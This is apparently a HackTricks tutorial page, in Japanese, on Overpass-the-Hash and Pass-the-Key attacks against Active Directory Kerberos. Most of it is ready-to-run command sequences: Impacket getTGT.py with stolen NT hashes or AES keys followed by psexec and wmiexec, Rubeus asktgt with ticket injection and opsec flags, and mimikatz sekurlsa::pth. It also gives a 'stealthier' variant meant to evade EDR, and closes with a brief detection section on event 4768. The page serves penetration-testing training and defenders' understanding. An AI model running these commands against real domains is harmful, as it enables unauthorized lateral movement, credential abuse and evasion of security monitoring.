# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 攻撃は、従来の NTLM プロトコルが制限され、Kerberos 認証が優先される環境向けに設計されています。この攻撃は、ユーザーの NTLM hash または AES keys を利用して Kerberos tickets を要求し、ネットワーク内のリソースへの不正アクセスを可能にします。

厳密には:

- **Over-Pass-the-Hash** は通常、**NT hash** を **RC4-HMAC** Kerberos key を通して Kerberos TGT に変換することを意味します。
- **Pass-the-Key** はより一般的な形で、すでに **AES128/AES256** のような Kerberos key を持っており、それを使って直接 TGT を要求します。

この違いはハードニングされた環境では重要です。**RC4 が無効化**されているか、KDC がもはやそれを前提としていない場合、**NT hash だけでは不十分**で、**AES key**（またはそれを導出するための平文パスワード）が必要になります。

この攻撃を実行するには、まず対象ユーザーアカウントの NTLM hash またはパスワードを入手する必要があります。これを確保すると、そのアカウントの Ticket Granting Ticket (TGT) を取得でき、攻撃者はユーザーが権限を持つサービスやマシンにアクセスできるようになります。

このプロセスは次のコマンドで開始できます:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256が必要なシナリオでは、`-aesKey [AES key]` オプションを利用できます:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` は `-service <SPN>` を使って **AS-REQ 経由で直接 service ticket を要求**することもサポートしており、追加の TGS-REQ なしで特定の SPN 用の ticket が欲しい場合に便利です:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
さらに、取得した ticket は `smbexec.py` や `wmiexec.py` などのさまざまな tools で利用でき、attack の範囲を広げることができます。

_PyAsn1Error_ や _KDC cannot find the name_ のような問題が発生した場合は、通常 Impacket library を更新するか、IP address の代わりに hostname を使用することで解決できます。これにより Kerberos KDC との互換性が確保されます。

Rubeus.exe を使用した別の command sequence は、この technique の別の側面を示しています:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
この手法は **Pass the Key** のアプローチを踏襲しており、認証目的で ticket を直接乗っ取り、利用することに重点があります。実際には:

- `Rubeus asktgt` は **生の Kerberos AS-REQ/AS-REP** をそのまま送信し、`/luid` で別の logon session を対象にしたい場合や、`/createnetonly` で別のものを作成したい場合を除き、admin 権限は **不要** です。
- `mimikatz sekurlsa::pth` は credential material を logon session にパッチし、そのため **LSASS に触れる** ため、通常は local admin か `SYSTEM` が必要で、EDR から見るとより目立ちます。

Mimikatz の例:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
operational security に準拠し、AES256 を使用するには、次のコマンドを適用できます:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` は重要です。なぜなら、Rubeus が生成する traffic は native Windows Kerberos と少し異なるからです。また、`/opsec` は **AES256** traffic 向けであり、RC4 で使うには通常 `/force` が必要ですが、その場合は本来の意味の多くが失われます。なぜなら、**現代の domains における RC4 自体が強い signal** だからです。

## Detection notes

すべての TGT request は DC 上で **event `4768`** を生成します。現在の Windows builds では、この event は古い writeups が述べているよりも多くの有用な fields を含みます。

- `TicketEncryptionType` は、発行された TGT にどの enctype が使われたかを示します。典型的な値は、**RC4-HMAC** で `0x17`、**AES128** で `0x11`、**AES256** で `0x12` です。
- 更新された events では `SessionKeyEncryptionType`、`PreAuthEncryptionType`、および client が広告した enctypes も確認でき、**本当の RC4 依存** と紛らわしい legacy defaults を見分けるのに役立ちます。
- 現代の環境で `0x17` が見えるのは、account、host、または KDC fallback path が今でも RC4 を許可しており、そのため NT-hash-based Over-Pass-the-Hash により適している、という良い手がかりです。

Microsoft は 2022 年 11 月の Kerberos hardening updates 以降、RC4-by-default の挙動を段階的に減らしてきており、現在公開されている guidance では、**2026 年 Q2 の終わりまでに AD DCs で default として想定される enctype から RC4 を削除する** ことになっています。攻撃者の観点では、これは **AES を使った Pass-the-Key** がますます信頼できる手段になっている一方で、従来の **NT-hash-only OpTH** は hardening 済みの環境ではより頻繁に失敗し続けることを意味します。

Kerberos encryption types と関連する ticketing behaviour についてさらに詳しく知るには、以下を参照してください。

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Each logon session can only have one active TGT at a time so be careful.

1. Cobalt Strike の **`make_token`** を使って、新しい logon session を作成します。
2. 次に、Rubeus を使って、既存の session に影響を与えずに新しい logon session 用の TGT を生成します。

Rubeus 自体からでも、犠牲にする **logon type 9** session を使えば、同様の isolation を実現できます:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
これは現在の session TGT を上書きしないため、通常は既存の logon session に ticket を import するよりも安全です。


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
